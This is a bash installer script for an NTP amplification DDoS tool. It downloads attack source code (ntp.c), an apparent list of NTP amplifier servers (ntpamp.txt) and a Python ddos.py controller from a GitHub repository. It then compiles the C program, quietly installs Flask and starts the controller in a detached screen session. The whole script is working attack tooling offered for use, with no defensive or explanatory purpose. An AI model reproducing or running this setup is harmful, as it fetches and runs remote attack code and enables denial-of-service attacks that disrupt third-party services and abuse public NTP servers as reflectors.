#!/bin/bash

# Display welcome message in red
echo -e "\033[31mWelcome to install ntp ddos\033[0m"

# Download files
echo "Downloading ntp.c..."
wget https://raw.githubusercontent.com/Meatbuns666/ntp-ddos/refs/heads/main/ntp.c -O ntp.c
if [ $? -ne 0 ]; then
    echo "Failed to download ntp.c"
    exit 1
fi

echo "Downloading ntpamp.txt..."
wget https://raw.githubusercontent.com/Meatbuns666/ntp-ddos/refs/heads/main/ntpamp.txt -O ntpamp.txt
if [ $? -ne 0 ]; then
    echo "Failed to download ntpamp.txt"
    exit 1
fi

echo "Download complete."

# Install gcc
echo "Installing gcc..."
sudo apt-get update
sudo apt-get install -y gcc
if [ $? -ne 0 ]; then
    echo "Failed to install gcc"
    exit 1
fi

# Compile ntp.c
echo "Compiling ntp.c..."
gcc ntp.c -o ntp -lpthread
if [ $? -ne 0 ]; then
    echo "Compilation failed"
    exit 1
fi

# Download ddos.py
echo "Downloading ddos.py..."
wget https://raw.githubusercontent.com/Meatbuns666/ntp-ddos/refs/heads/main/ddos.py -O ddos.py
if [ $? -ne 0 ]; then
    echo "Failed to download ddos.py"
    exit 1
fi

# Check and install python3 and pip3 if not present
if ! command -v python3 &> /dev/null
then
    sudo apt-get install -y python3 > /dev/null 2>&1
fi

if ! command -v pip3 &> /dev/null
then
    sudo apt-get install -y python3-pip > /dev/null 2>&1
fi

# Install Flask silently and notify on completion
echo -e "\033[31mInstalling Flask in the background, please wait...\033[0m"
pip3 install flask --ignore-installed --no-warn-script-location --break-system-packages > /dev/null 2>&1 &
wait $!

echo -e "\033[31mFlask installation complete\033[0m"

# Install screen if not present
if ! command -v screen &> /dev/null
then
    sudo apt-get install -y screen > /dev/null 2>&1
fi

# Create a screen session and run ddos.py in the background
screen -dmS ddos python3 ddos.py

echo "All tasks completed successfully."
